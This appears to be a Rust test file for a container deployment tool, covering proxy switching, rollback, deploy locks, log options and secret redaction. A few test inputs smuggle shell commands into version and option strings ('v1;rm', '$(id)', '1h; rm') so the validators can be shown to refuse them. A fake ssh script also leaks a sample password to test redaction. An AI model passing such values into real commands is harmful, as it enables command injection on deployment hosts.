    RunError::Remote(RemoteError {
        host: host.to_owned(),
        exit_code: code,
        stderr: stderr.to_owned(),
        stdout: String::new(),
    })
}

#[test]
fn proxy_switch_failure_without_previous_keeps_healthy_hosts() {
    let fixture = plan_fixture(false);
    fixture.runner.inventory.lock().expect("lock").clear();
    fixture.runner.fail_with(|host, command| {
        (host == "192.0.2.11" && command.script.contains("forge-proxy deploy"))
            .then(|| remote(host, 4, "not healthy"))
    });
    let error = fixture
        .deployer
        .deploy(&Cancel::never(), "v3", true)
        .1
        .expect_err("unhealthy");
    assert_eq!(error.exit_code(), EXIT_UNHEALTHY, "{error}");
    assert!(
        error
            .message
            .contains("every host serves its previous version"),
        "{error}"
    );
    let calls = fixture.runner.calls().join("\n");
    assert!(
        !calls.contains("192.0.2.10: docker stop -t 35 shop-web-v3"),
        "first deploy removed the only healthy container:\n{calls}"
    );
    assert!(
        calls.contains("192.0.2.11: docker rm shop-web-v3"),
        "failed container not removed:\n{calls}"
    );
}

#[test]
fn unhealthy_host_reverts_every_switched_host() {
    let fixture = plan_fixture(false);
    fixture.runner.fail_with(|host, command| {
        (host == "192.0.2.11" && command.script.contains("forge-proxy deploy"))
            .then(|| remote(host, 4, "not healthy"))
    });
    let error = fixture
        .deployer
        .deploy(&Cancel::never(), "v3", true)
        .1
        .expect_err("unhealthy");
    assert_eq!(error.exit_code(), EXIT_UNHEALTHY);
    let calls = fixture.runner.calls().join("\n");
    assert!(calls.contains("192.0.2.10: docker exec forge-proxy /usr/local/bin/forge-proxy deploy -service shop -target shop-web-v2-bbbbbb:8080"), "{calls}");
    assert!(
        calls.contains("192.0.2.10: docker rm shop-web-v3-"),
        "{calls}"
    );
    assert!(
        !calls.contains("docker stop -t 35 shop-web-v2-bbbbbb"),
        "previous stopped:\n{calls}"
    );
    assert!(
        fixture
            .log
            .text()
            .contains("traffic switched back to shop-web-v2-bbbbbb")
    );
}

#[test]
fn revert_failure_is_inconsistent() {
    let fixture = plan_fixture(false);
    fixture.runner.fail_with(|host, command| {
        if host == "192.0.2.11" && command.script.contains("forge-proxy deploy") {
            return Some(remote(host, 4, "not healthy"));
        }
        if host == "192.0.2.10" && command.script.contains("-target shop-web-v2-bbbbbb") {
            return Some(remote(host, 1, "proxy gone"));
        }
        None
    });
    let error = fixture
        .deployer
        .deploy(&Cancel::never(), "v3", true)
        .1
        .expect_err("inconsistent");
    assert_eq!(error.exit_code(), EXIT_INCONSISTENT, "{error}");
    assert!(error.message.contains("proxy gone"), "{error}");
}

#[test]
fn interrupted_switch_is_inconsistent_without_revert() {
    let fixture = plan_fixture(false);
    let shutdown = crate::process::Shutdown::new();
    let trigger = shutdown.clone();
    fixture.runner.fail_with(move |host, command| {
        if command.script.contains("forge-proxy deploy") {
            trigger.request();
            return Some(remote(host, 1, "interrupted"));
        }
        None
    });
    let error = fixture
        .deployer
        .deploy(&Cancel::signal(shutdown), "v3", true)
        .1
        .expect_err("interrupted");
    assert_eq!(error.exit_code(), EXIT_INCONSISTENT, "{error}");
    assert!(
        error.message.starts_with("interrupted while switching"),
        "{error}"
    );
}

#[test]
fn migration_failure_aborts_before_any_switch() {
    let fixture = plan_fixture(false);
    fixture.runner.fail_with(|host, command| {
        command
            .script
            .contains("-migrate-")
            .then(|| remote(host, 1, "migration 0002 failed"))
    });
    let error = fixture
        .deployer
        .deploy(&Cancel::never(), "v3", true)
        .1
        .expect_err("migration");
    assert_eq!(error.exit_code(), EXIT_MIGRATION_FAILED, "{error}");
    assert!(
        error
            .message
            .starts_with("migration failed; nothing was switched"),
        "{error}"
    );
    let calls = fixture.runner.calls().join("\n");
    assert!(
        !calls.contains("docker run --detach"),
        "a container started:\n{calls}"
    );
    assert!(
        calls.contains("rm -rf .forge/shop/lock"),
        "lock not released:\n{calls}"
    );
}

#[test]
fn held_lock_is_reported_and_partial_locks_released() {
    let fixture = plan_fixture(false);
    fixture.runner.fail_with(|host, command| {
        (host == "192.0.2.11" && command.script.contains("mkdir .forge/shop/lock")).then(|| {
            RunError::Remote(RemoteError {
                host: host.to_owned(),
                exit_code: LOCK_HELD_EXIT_STATUS,
                stderr: String::new(),
                stdout: "{\"holder\":\"bob@ci\",\"message\":\"maintenance window\",\"acquired_at\":\"2026-10-19T11:00:00Z\"}\n".to_owned(),
            })
        })
    });
    let error = fixture
        .deployer
        .deploy(&Cancel::never(), "v3", true)
        .1
        .expect_err("held");
    assert_eq!(error.exit_code(), EXIT_LOCK_HELD);
    assert_eq!(
        error.message,
        "deploy lock is held: 192.0.2.11: held by bob@ci since 2026-10-19 11:00:00 UTC (maintenance window); wait, or release it with forge deploy lock release"
    );
    let calls = fixture.runner.calls().join("\n");
    assert!(
        calls.contains("192.0.2.10: rm -rf .forge/shop/lock"),
        "{calls}"
    );
    assert!(!calls.contains("192.0.2.11: rm -rf"), "{calls}");
}

#[test]
fn lock_release_refuses_someone_elses_lock_without_force() {
    let fixture = plan_fixture(false);
    fixture.runner.answers.lock().expect("lock").push((
        "if [ -d .forge/shop/lock ]".to_owned(),
        "{\"holder\":\"bob@ci\",\"message\":\"window\",\"acquired_at\":\"2026-10-19T11:00:00Z\"}\n"
            .to_owned(),
    ));
    let locks = fixture
        .deployer
        .lock_status(&Cancel::never())
        .expect("status");
    assert_eq!(locks.len(), 3);
    assert_eq!(locks["192.0.2.20"].holder, "bob@ci");
    let error = fixture
        .deployer
        .lock_release(&Cancel::never(), false)
        .expect_err("held by bob");
    assert_eq!(error.exit_code(), EXIT_LOCK_HELD);
    assert_eq!(
        error.message,
        "192.0.2.10: lock is held by bob@ci (window); pass --force to release it anyway"
    );
    assert!(
        !fixture
            .runner
            .calls()
            .iter()
            .any(|call| call.contains("rm -rf"))
    );
    fixture
        .deployer
        .lock_release(&Cancel::never(), true)
        .expect("forced");
    let released = fixture
        .runner
        .calls()
        .iter()
        .filter(|call| call.ends_with("rm -rf .forge/shop/lock"))
        .count();
    assert_eq!(released, 3);
}

#[test]
fn rollback_to_an_unknown_version_changes_nothing() {
    let fixture = plan_fixture(false);
    let error = fixture
        .deployer
        .rollback(&Cancel::never(), "v9")
        .1
        .expect_err("missing");
    assert!(
        error
            .message
            .contains("version v9 is not retained on 192.0.2.10/web (available: v2, v1, v0)"),
        "{error}"
    );
    let calls = fixture.runner.calls().join("\n");
    assert!(!calls.contains("docker start"), "{calls}");
}

#[test]
fn invalid_versions_are_refused() {
    let fixture = plan_fixture(false);
    for version in ["", "-x", "a b", "v1;rm", "$(id)", &"x".repeat(65)] {
        let (report, result) = fixture.deployer.deploy(&Cancel::never(), version, true);
        assert!(report.is_none() && result.is_err(), "{version:?} accepted");
    }
    assert!(fixture.runner.calls().is_empty());
}

#[test]
fn applied_boot_is_newest_despite_clock_skew() {
    let host_ahead = plan_epoch().plus(Duration::from_secs(3600));
    let mut older = host_ahead;
    older.unix_seconds -= 60;
    let containers = vec![
        Container {
            name: "shop-web-v2-b".into(),
            role: "web".into(),
            version: "v2".into(),
            state: "running".into(),
            image: String::new(),
            created: host_ahead,
        },
        Container {
            name: "shop-web-v1-a".into(),
            role: "web".into(),
            version: "v1".into(),
            state: "exited".into(),
            image: String::new(),
            created: older,
        },
    ];
    let boot = Boot {
        host: "192.0.2.10".into(),
        role: "web".into(),
        name: "shop-web-v3-c".into(),
        version: "v3".into(),
        existing: false,
        previous: containers[..1].to_vec(),
        started: false.into(),
        switched: false.into(),
    };
    let got = apply_boot(containers, &boot, plan_epoch());
    assert_eq!(got[0].name, "shop-web-v3-c");
    assert!(got[0].created.total_nanos() > host_ahead.total_nanos());
    let fixture = plan_fixture(false);
    let (pruned, _) = fixture
        .deployer
        .prune_host(&Cancel::never(), "192.0.2.10", got);
    assert_eq!(
        pruned.first().map(String::as_str),
        Some("192.0.2.10:shop-web-v1-a")
    );
}

#[test]
fn inventory_parsing_sorts_newest_first() {
    let output = ps_json("old", "web", "v1", "exited", plan_epoch())
        + &ps_json(
            "new",
            "web",
            "v2",
            "running",
            plan_epoch().plus(Duration::from_secs(5)),
        );
    let containers = parse_inventory(&output).expect("inventory");
    assert_eq!(containers[0].name, "new");
    assert!(containers[0].running());
    assert!(parse_inventory("not json\n").is_err());
    let json = serde_json::to_value(&containers[1]).expect("json");
    assert_eq!(json["created"], "2026-10-19T12:00:00Z");
}

/// A fake `ssh` that prints a secret on stderr and fails.
fn leaky_ssh(dir: &Path, secret: &str) -> PathBuf {
    use std::os::unix::fs::PermissionsExt as _;
    let path = dir.join("ssh");
    std::fs::write(
        &path,
        format!("#!/bin/sh\necho 'connect failed: {secret}' >&2\nexit 3\n"),
    )
    .expect("write");
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o700)).expect("chmod");
    path
}

/// A failing remote command whose stderr carries a secret must not leak
/// it through the returned error, on any path that reaches the runner.
#[test]
fn remote_errors_are_redacted_on_every_runner_path() {
    const SECRET: &str = "postgres://shop:leaky-password-42@db/shop";
    let dir = tempfile::tempdir().expect("tempdir");
    let mut runner = SshRunner::new(&super::config::Ssh::default());
    runner.binary = leaky_ssh(dir.path(), SECRET);
    let log = Buffer::default();
    let deployer = Deployer::new(Parts {
        config: parse(VALID_CONFIG),
        secrets: Secrets::from_values([
            ("REGISTRY_PASSWORD", "registry-secret-1"),
            ("FORGE_DATABASE_URL", SECRET),
            ("POSTGRES_PASSWORD", "pg-secret-3"),
        ]),
        runner: Box::new(runner),
        local: Box::new(RecordingLocal::default()),
        root: dir.path().to_owned(),
        log: log.writer(),
        performer: Some("alice@laptop".into()),
        now: None,
        suffix: None,
        dry_run: false,
    });
    let out = Buffer::default();
    let cancel = Cancel::never();
    let checks = [
        (
            "exec",
            deployer.exec(
                &cancel,
                out.writer(),
                &ExecOptions {
                    argv: vec!["migrate".into(), "status".into()],
                    ..ExecOptions::default()
                },
            ),
        ),
        (
            "exec --reuse",
            deployer.exec(
                &cancel,
                out.writer(),
                &ExecOptions {
                    reuse: true,
                    argv: vec!["/app/server".into()],
                    ..ExecOptions::default()
                },
            ),
        ),
        (
            "logs",
            deployer.logs(&cancel, out.writer(), LogsOptions::default()),
        ),
        (
            "logs follow",
            deployer.logs(
                &cancel,
                out.writer(),
                LogsOptions {
                    follow: true,
                    ..LogsOptions::default()
                },
            ),
        ),
        ("lock status", deployer.lock_status(&cancel).map(|_| ())),
        ("setup", deployer.setup(&cancel).1),
    ];
    for (name, result) in checks {
        let error = result.expect_err(name);
        assert!(
            !error.message.contains("leaky-password"),
            "{name}: error leaks the secret: {error}"
        );
        assert!(
            error.message.contains(REDACTED),
            "{name}: lost the redacted diagnostic: {error}"
        );
    }
    assert!(
        !out.text().contains("leaky-password"),
        "streamed output leaks the secret"
    );
    assert!(!log.text().contains("leaky-password"));
}

#[test]
fn logs_validate_options_and_prefix_lines() {
    let fixture = plan_fixture(false);
    let out = Buffer::default();
    let cancel = Cancel::never();
    for (options, want) in [
        (
            LogsOptions {
                since: "1h; rm".into(),
                ..LogsOptions::default()
            },
            "--since must be",
        ),
        (
            LogsOptions {
                lines: -1,
                ..LogsOptions::default()
            },
            "--lines must be",
        ),
        (
            LogsOptions {
                grep: "(".into(),
                ..LogsOptions::default()
            },
            "--grep:",
        ),
        (
            LogsOptions {
                role: "db".into(),
                ..LogsOptions::default()
            },
            "unknown role \"db\"",
        ),
        (
            LogsOptions {
                host: "192.0.2.99".into(),
                ..LogsOptions::default()
            },
            "does not run role web",
        ),
    ] {
        let error = fixture
            .deployer
            .logs(&cancel, out.writer(), options)
            .expect_err(want);
        assert!(error.message.contains(want), "{error}");
    }
    let writer = super::remote::PrefixWriter::new(
        "alpha|".into(),
        out.writer(),
        regex_automata::meta::Regex::new("booted|connecting").ok(),
        Secrets::from_values([("DB", "db-secret-2")]).redactor(),
    );
    writer.write(b"booted with db-secret-2\r\nERROR skipped\nconnecting");
    writer.flush();
    assert_eq!(
        out.text(),
        "alpha|booted with [REDACTED]\nalpha|connecting\n"
    );
}

fn common(_root: &Path) -> Common {
    Common {
        config: PathBuf::from(DEFAULT_CONFIG_PATH),
        secrets: PathBuf::from(".forge/secrets"),
        dry_run: false,
        json: false,
    }
}

fn io() -> (Io, Buffer, Buffer) {
    let (out, err) = (Buffer::default(), Buffer::default());
    (
        Io {
            stdout: out.writer(),
            stderr: err.writer(),
        },
        out,
        err,
    )
}

#[test]
fn init_writes_templates_once_and_ignores_secrets() {
    let root = tempfile::tempdir().expect("tempdir");
    std::fs::write(root.path().join(".gitignore"), "target/").expect("gitignore");
    let (changed, result) = init(root.path(), "shop");
    result.expect("init");
    assert_eq!(
        changed,
        [
            DEFAULT_CONFIG_PATH,
            ".forge/secrets",
            ".gitignore",
            ".dockerignore"
        ]
    );
    let config =
        Config::load(&root.path().join(DEFAULT_CONFIG_PATH)).expect("generated config is valid");
    assert_eq!(config.service, "shop");
    assert_eq!(config.image, "registry.example.com/acme/shop");
    assert_eq!(config.proxy.app_port, 3000);
    {
        use std::os::unix::fs::PermissionsExt as _;
        let mode = std::fs::metadata(root.path().join(".forge/secrets"))
            .expect("secrets")
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o600);
    }
    assert_eq!(
        std::fs::read_to_string(root.path().join(".gitignore")).expect("read"),
        "target/\n# forge deploy\n.forge/secrets\n"
    );
    assert!(
        std::fs::read_to_string(root.path().join(".dockerignore"))
            .expect("read")
            .contains(".forge\n")
    );
    let (_, again) = init(root.path(), "shop");
    assert!(again.expect_err("second init").contains("already exists"));
    assert!(
        init(tempfile::tempdir().expect("tempdir").path(), "Bad Name")
            .1
            .is_err()
    );
    // The secrets template resolves through the environment and covers the
    // template configuration.
    let secrets = Secrets::load(&root.path().join(".forge/secrets"), &|name| {
        Some(format!("value-of-{name}"))
    })
    .expect("secrets");
    secrets
        .require(&config.secret_names())
        .expect("template secrets cover the config");
}

#[test]
fn default_service_name_comes_from_cargo_toml() {
    let root = tempfile::tempdir().expect("tempdir");
    std::fs::write(
        root.path().join("Cargo.toml"),
        "[package]\nname = \"Shop_Front\"\nversion = \"0.1.0\"\n",
    )
    .expect("manifest");
    assert_eq!(default_service_name(root.path()), "shop-front");
    let numeric = tempfile::tempdir().expect("tempdir");
    let dir = numeric.path().join("42");
    std::fs::create_dir(&dir).expect("dir");
    assert_eq!(default_service_name(&dir), "app-42");
}

#[test]
fn run_deploy_reports_config_errors_and_init() {
    let root = tempfile::tempdir().expect("tempdir");
    let (io, out, _) = io();
    let factory = Factory::system();
    let error = run_deploy(
        DeployAction::Setup,
        &common(root.path()),
        root.path(),
        &io,
        &factory,
        &Cancel::never(),
    )
    .expect_err("missing config");
    assert!(
        error.message == "read deploy config: open config/deploy.yml: no such file or directory",
        "{error}"
    );
    std::fs::write(
        root.path().join("Cargo.toml"),
        "[package]\nname = \"storefront\"\n",
    )
    .expect("manifest");
    run_deploy(
        DeployAction::Init { service: None },
        &common(root.path()),
        root.path(),
        &io,
        &factory,
        &Cancel::never(),
    )
    .expect("init");
    assert!(
        out.text().contains("wrote .forge/secrets"),
        "{}",
        out.text()
    );
    let config = Config::load(&root.path().join(DEFAULT_CONFIG_PATH)).expect("config");
    assert_eq!(config.service, "storefront");
    let mut dry = common(root.path());
    dry.dry_run = true;
    assert!(
        run_deploy(
            DeployAction::Details,
            &dry,
            root.path(),
            &io,
            &factory,
            &Cancel::never()
        )
        .is_err()
    );
    let mut json = common(root.path());
    json.json = true;
    assert!(
        run_deploy(
            DeployAction::Maintenance { on: true },
            &json,
            root.path(),
            &io,
            &factory,
            &Cancel::never()
        )
        .is_err()
    );
}

#[test]
fn json_report_is_printed_also_on_failure() {
    let fixture = plan_fixture(false);
    fixture.runner.fail_with(|host, command| {
        command
            .script
            .contains("-migrate-")
            .then(|| remote(host, 1, "boom"))
    });
    let (io, out, _) = io();
    let mut common = common(Path::new("/nonexistent"));
    common.json = true;
    let outcome = fixture.deployer.deploy(&Cancel::never(), "v3", true);
    let result = super::cli::finish_report(&common, &io, outcome, "deployed v3");
    let error = result.expect_err("migration");
    assert_eq!(error.exit_code(), EXIT_MIGRATION_FAILED);
    let report: serde_json::Value = serde_json::from_str(out.text().trim()).expect("one JSON line");
    assert_eq!(report["ok"], false);
    assert_eq!(report["exit_code"], 5);
    assert_eq!(report["action"], "deploy");
    assert!(
        report["error"]
            .as_str()
            .unwrap_or_default()
            .contains("migration failed")
    );
}

/// The configuration documented in docs/deployment.md must stay valid.
#[test]
fn documented_config_is_valid() {
    let guide = std::fs::read_to_string(
        Path::new(env!("CARGO_MANIFEST_DIR")).join("../../docs/deployment.md"),
    )
    .expect("docs/deployment.md");
    let (_, rest) = guide
        .split_once("### config/deploy.yml\n\n```yaml\n")
        .expect("docs/deployment.md lacks the config/deploy.yml example");
    let example = rest.split("```").next().unwrap_or_default();
    let config = parse(example);
    assert_eq!(config.service, "shop");
    assert_eq!(config.accessories.len(), 1);
    assert!(!config.ssh.proxy_jump.is_empty());
}

/// Forge-Go's documented example (its DEPLOYMENT.md) parses unchanged.
#[test]
fn forge_go_documented_config_is_valid() {
    let example = r#"service: shop                                # container names, ~/.forge/shop
image: registry.example.com/acme/shop        # no tag: the version is the tag
registry:
  server: registry.example.com
  username: acme
  password: REGISTRY_PASSWORD                # a secret NAME, not the password
servers:
  web:                                       # routed through forge-proxy
    hosts: [192.0.2.10, 192.0.2.11]
  jobs:
    hosts: [192.0.2.11]
    cmd: ["jobs"]                            # arguments to the image entrypoint
    env: {clear: {JOBS_CONCURRENCY: "8"}}
env:
  clear: {FORGE_ENV: production}
  secret: [FORGE_DATABASE_URL, FORGE_AUTH_MFA_KEY]
volumes: []                                  # e.g. shop-storage:/app/storage (SQLite)
proxy:
  image: registry.example.com/acme/forge-proxy@sha256:...
  hosts: [shop.example.com]
  ssl: true                                  # Let's Encrypt (accepts its terms)
  acme_email: ops@example.com
  app_port: 8080
  healthcheck: {path: /health/ready, interval: 1s, timeout: 2s, healthy_count: 3, deploy_timeout: 60s}
  drain_timeout: 30s
  response_timeout: 30s
  max_body_bytes: 67108864
migrate: {enabled: true, cmd: ["migrate"], role: web}
accessories:
  db:
    image: postgres:18-alpine
    host: 192.0.2.20
    port: 5432                               # published on 127.0.0.1 only
    volumes: ["shop-postgres:/var/lib/postgresql"]
    env: {secret: [POSTGRES_PASSWORD]}
builder: {context: ., dockerfile: Dockerfile, platform: linux/amd64, args: {GO_VERSION: "1.27"}}
retain: 5                                    # stopped versions kept for rollback
stop_timeout: 35s                            # > FORGE_HTTP_SHUTDOWN_TIMEOUT
boot_timeout: 60s                            # readiness wait for non-proxied roles
hooks: .forge/hooks
parallelism: 4                               # hosts handled at once
ssh: {user: deploy, port: 22, proxy_jump: bastion.example.com}
"#;
    let config = parse(example);
    assert_eq!(config.servers["jobs"].env.clear["JOBS_CONCURRENCY"], "8");
    assert_eq!(
        config.proxy.healthcheck.deploy_timeout,
        GoDuration::from_secs(60)
    );
    assert_eq!(config.builder.args["GO_VERSION"], "1.27");
    let _ = LockAction::Status;
}
